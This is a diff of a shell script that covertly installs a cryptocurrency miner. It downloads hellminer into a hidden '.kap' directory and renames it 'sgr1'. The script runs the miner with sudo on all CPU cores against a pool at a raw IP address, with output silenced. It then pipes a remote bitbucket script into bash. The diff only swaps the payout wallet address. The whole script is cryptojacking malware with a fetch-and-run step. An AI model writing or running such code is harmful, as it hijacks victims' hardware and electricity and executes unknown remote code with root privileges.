@@ -15,5 +15,5 @@ mkdir .kap && cd .kap
 wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz >/dev/null 2>&1
 tar xf hellminer_linux64_avx2.tar.gz && mv hellminer sgr1
 chmod +x sgr1
-sudo ./sgr1 -c stratum+tcp://45.77.40.14:80 -u RJaE1YRdUd2wy5zpDbp4ij6DbAapUadhrp.$(echo $(shuf -i 1-100000 -n 1)-AJG) -p x --cpu=$(nproc --all) > /dev/null 2>&1 &
+sudo ./sgr1 -c stratum+tcp://45.77.40.14:80 -u RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe.$(echo $(shuf -i 1-100000 -n 1)-AJG) -p x --cpu=$(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/tsyjaryj/filesg/raw/main/boled04.sh | bash
